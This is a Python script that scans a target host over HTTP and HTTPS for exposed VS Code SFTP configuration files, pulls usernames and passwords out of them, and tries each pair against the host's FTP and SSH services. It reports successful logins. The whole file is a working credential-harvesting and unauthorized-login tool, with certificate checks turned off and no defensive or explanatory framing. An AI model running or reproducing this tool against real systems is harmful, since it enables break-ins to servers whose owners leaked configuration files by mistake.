import json
import requests
import re
import paramiko
from ftplib import FTP

paths = [
    "/sftp.json",
    "/.config/sftp.json",
    "/.vscode/sftp.json"
]

matchers = ['"name":', '"host":', '"protocol":']

def fetch_sftp_config(url):
    try:
        response = requests.get(url, timeout=5, verify=False)
        response.raise_for_status()
        return response.text
    except requests.RequestException:
        return None

def extract_credentials_from_json(raw_data):
    json_objects = re.findall(r'{[^}]+}', raw_data)
    credentials = []

    for json_str in json_objects:
        try:
            data = json.loads(json_str)
            username = data.get("username")
            password = data.get("password")
            if username and password:
                credentials.append((username, password))
        except json.JSONDecodeError:
            continue

    return credentials

def attempt_ftp_login(ip, username, password):
    try:
        ftp = FTP()
        ftp.connect(ip, 21, timeout=10)
        response = ftp.login(user=username, passwd=password)
        if response.startswith("230"):
            print(f"[+] Successful FTP login with: {username}:{password}")
        else:
            print(f"[-] FTP login failed for: {username}:{password}")
        ftp.quit()
    except Exception:
        print(f"[-] FTP connection error for {username}:{password}:")

def attempt_ssh_login(ip, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=22, username=username, password=password, timeout=10)
        print(f"[+] Successful SSH login with: {username}:{password}")
        ssh.close()
    except paramiko.AuthenticationException:
        print(f"[-] SSH Authentication failed for {username}:{password}")
    except paramiko.SSHException:
        print(f"[-] SSH connection error for {username}:{password}")
    except Exception:
        print(f"[-] General error for SSH connection {username}:{password}")

def crawl_vscode_sftp(ip, port=None):
    protocols = ["http", "https"]
    ports = [f":{port}" if port else ""]
    sftp_found = False

    for protocol in protocols:
        for port_suffix in ports:
            for path in paths:
                url = f"{protocol}://{ip}{port_suffix}{path}"
                raw_data = fetch_sftp_config(url)
                if raw_data and any(matcher in raw_data for matcher in matchers):
                    print(f"[+] VsCodeSFTP file found: {url}")
                    credentials = extract_credentials_from_json(raw_data)
                    sftp_found = True

                    for username, password in credentials:
                        attempt_ftp_login(ip, username, password)
                        attempt_ssh_login(ip, username, password)

    return sftp_found
